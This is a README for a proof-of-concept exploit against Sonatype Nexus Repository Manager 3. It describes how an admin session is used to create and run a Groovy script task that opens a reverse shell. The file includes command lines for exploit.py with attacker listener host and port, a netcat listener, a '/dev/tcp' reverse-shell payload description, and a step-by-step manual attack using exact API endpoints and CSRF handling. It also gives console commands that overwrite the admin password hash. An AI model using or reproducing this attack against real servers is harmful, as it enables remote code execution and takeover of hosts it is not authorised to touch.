# Nexus Repository Manager 3 Authenticated RCE (Groovy Script Task)

This repository contains `exploit.py`, a proof-of-concept exploit that performs **authenticated remote code execution** on Sonatype Nexus Repository Manager 3 by creating and running a **Groovy "script" task** as an authenticated admin user.

## Key points

- **Exploit type**: Authenticated RCE (requires valid admin creds)
- **Technique**: Create a scheduled task of type `script` (Groovy) and run it to execute an OS command / reverse shell
- **Default payload mode**: **Windows** (`cmd.exe` via `ProcessBuilder`)
- **Linux mode**: Supported in code via `--linux`, but **NOT TESTED** (see "Linux note")

## Tested environment

- **Product**: Sonatype Nexus Repository Manager `3.41.1-01`
- **Target OS**: Windows

## Setting up Nexus (lab)

These steps describe how to stand up **Nexus 3.41.1-01 on Windows** for a local lab, then set the admin password to `admin123` (the value used in the examples above).

### 1) Download the repository

- Clone this repository.

### 2) Start Nexus

From the extracted directory, run Nexus in the foreground:

```bash
.\nexus-3.41.1-01\bin\nexus.exe /run
```

Wait until the service finishes starting, then browse to:

- `http://<target-ip>:8081/`

### 3) Change the admin password

From the Nexus OrientDB console, run the following commands:

```powershell
connect plocal:F:/nexus/sonatype-work/nexus3/db/security admin admin
update user SET password="$shiro1$SHA-512$1024$NE+wqQq/TmjZMvfI7ENh/g==$V4yPw8T64UQ6GfJfxYq2hLsVrBY8D1v+bktfOxGdt4b/9BthpWPNUy/CBk6V9iA0nHpzYzJFWO8v/tZFtES8CA==" UPSERT WHERE id="admin"
update user set status="active" upsert where id="admin"
update user_role_mapping set roles=["nx-admin"] where userId="admin"
select status from user where id="admin"
select roles from user_role_mapping where userId="admin"
exit
```

Then run this PowerShell snippet to execute the commands using Nexus's OrientDB console jar:

```powershell
$commands = @'
connect plocal:F:/nexus/sonatype-work/nexus3/db/security admin admin
update user SET password="$shiro1$SHA-512$1024$NE+wqQq/TmjZMvfI7ENh/g==$V4yPw8T64UQ6GfJfxYq2hLsVrBY8D1v+bktfOxGdt4b/9BthpWPNUy/CBk6V9iA0nHpzYzJFWO8v/tZFtES8CA==" UPSERT WHERE id="admin"
update user set status="active" upsert where id="admin"
update user_role_mapping set roles=["nx-admin"] where userId="admin"
select status from user where id="admin"
select roles from user_role_mapping where userId="admin"
exit
'@
$commands | & "F:\nexus\nexus-3.41.1-01\jre\bin\java.exe" -jar "F:\nexus\nexus-3.41.1-01\lib\support\nexus-orient-console.jar"
```


## Requirements

- Python 3.9+ recommended
- Python dependency: `requests`
- Network access to the Nexus web interface
- A listener ready for reverse shell (e.g. `nc -lvnp <port>`)

## What the script does (high level)

1. **Authenticates** to Nexus via the UI session endpoint and receives an authenticated session cookie.
2. **Creates a task** (type `script`) using the ExtDirect API and stores a Groovy payload in the task definition.
3. **Runs the task** via the REST API endpoint for task execution.
4. The Groovy payload establishes a reverse shell to your listener.

## Usage

### Windows target (default)

Windows is the default mode. You can optionally pass `--windows` for clarity.

```bash
python exploit.py -t http://nexus.local:8081 -u admin -p admin123 -lh 10.10.14.15 -lp 9001
```

If the run is accepted, Nexus may return **HTTP 204** (No Content). The script treats **200/204** as "executed/queued".

### Linux target (NOT TESTED)

The script supports a Linux Groovy payload generator via `--linux`, but **this has not been tested on a Linux target**.

```bash
python exploit.py -t http://nexus.local:8081 -u admin -p admin123 -lh 10.10.14.15 -lp 9001 --linux
```

## Payload behavior

### Windows (default)

- Uses Groovy + Java `ProcessBuilder(cmd).redirectErrorStream(true).start()`
- `--command` controls which program is executed (default: `cmd.exe`)

### Linux (`--linux`) — NOT TESTED

- Uses Groovy + Java `Runtime.getRuntime().exec(["/bin/bash","-c", "..."] as String[])`
- Uses a `/dev/tcp/<LHOST>/<LPORT>` reverse shell style command
- Note: this assumes `/bin/bash` exists and `/dev/tcp` is supported by the shell

## Manual exploitation steps (no script)

Below is a "manual" walkthrough of what `exploit.py` automates. Exact headers/cookies matter; capture your own traffic and mirror the UI behavior for best results.

### 1) Start a listener

- On your machine, start a TCP listener on your chosen port.

### 2) Authenticate and obtain a session cookie

- **Endpoint**: `POST /service/rapture/session`
- **Goal**: Obtain `NXSESSIONID` cookie (authenticated session)
- **CSRF**: The UI uses `NX-ANTI-CSRF-TOKEN` header + cookie. The value behaves like a random token; the script uses a random float string.

At a minimum, you need:

- `NX-ANTI-CSRF-TOKEN` cookie
- `NX-ANTI-CSRF-TOKEN` header
- Credentials sent as Base64-encoded values in form data (`username`, `password`)

Success typically returns:

- **HTTP 204** and a response cookie: `NXSESSIONID=<...>`

### 3) Create a Groovy "script" task

- **Endpoint**: `POST /service/extdirect`
- **Action**: `coreui_Task`
- **Method**: `create`
- **Task type**: `script`
- **Task schedule**: `manual`
- **Properties**: provide Groovy source under:
  - `properties.language = "groovy"`
  - `properties.source = "<your groovy payload>"`

On success, the ExtDirect JSON response includes a `data.id` field, which is the **task ID**.

### 4) Run the created task

- **Endpoint**: `POST /service/rest/v1/tasks/<task_id>/run`

Success may return:

- **HTTP 200**, or
- **HTTP 204 No Content** (accepted/queued with no body)

### 5) Catch the reverse shell

- If the payload executes successfully, you should receive a connection on your listener at:
  - `LHOST:LPORT`

## Notes / limitations

- **Authenticated**: This exploit requires admin credentials (or a privileged account that can create/run tasks).
- **Linux mode is not tested**: The script includes a Linux payload option, but it has **not been tested on Linux targets**.
- **No cleanup**: The script does not delete the created task. If you want cleanup, delete the task in the Nexus UI/API after use.

## Legal / ethics

Use only on systems you own or have explicit permission to test.

